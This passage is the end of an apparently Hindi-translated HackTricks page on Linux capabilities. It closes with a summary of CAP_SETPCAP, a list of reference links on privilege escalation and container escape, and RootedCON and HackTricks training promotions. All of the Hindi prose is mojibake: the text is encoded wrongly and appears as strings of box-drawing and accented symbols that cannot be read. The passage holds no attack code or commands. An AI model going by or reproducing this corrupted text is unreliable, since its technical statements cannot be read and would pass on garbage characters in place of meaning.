рд╕рдХрддреЗ рд╣реИрдВред

рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ, `CAP_SETPCAP` рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рдЬреЛ рдЙрд╕рдХреЗ рдкрд╛рд╕ рд╕реНрд╡рдпрдВ рдирд╣реАрдВ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг, рд╣рд╛рд▓ рдХреЗ рдХрд░реНрдиреЗрд▓ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЗрд╕рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдпрд╛ рдЕрдкрдиреЗ рд╡рдВрд╢рдЬреЛрдВ рдХреЗ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реАрдорд┐рдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

**рдЗрдирдореЗрдВ рд╕реЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рдЙрджрд╛рд╣рд░рдг** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) рдХреЗ рдХреБрдЫ рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛рдУрдВ рд╕реЗ рд▓рд┐рдП рдЧрдП рдереЗ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдЗрд╕ рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдореИрдВ рдЗрди рдкреНрд░рдпреЛрдЧрд╢рд╛рд▓рд╛рдУрдВ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБред

**рдЕрдиреНрдп рд╕рдВрджрд░реНрдн**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

тАЛ

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рдЕрдиреБрд╢рд╛рд╕рди рдореЗрдВ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдкреЗрд╢реЗрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрд╖реНрдгрдХрдЯрд┐рдмрдВрдзреАрдп рдмреИрдардХ рдмрд┐рдВрджреБ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
</details>
{% endhint %}
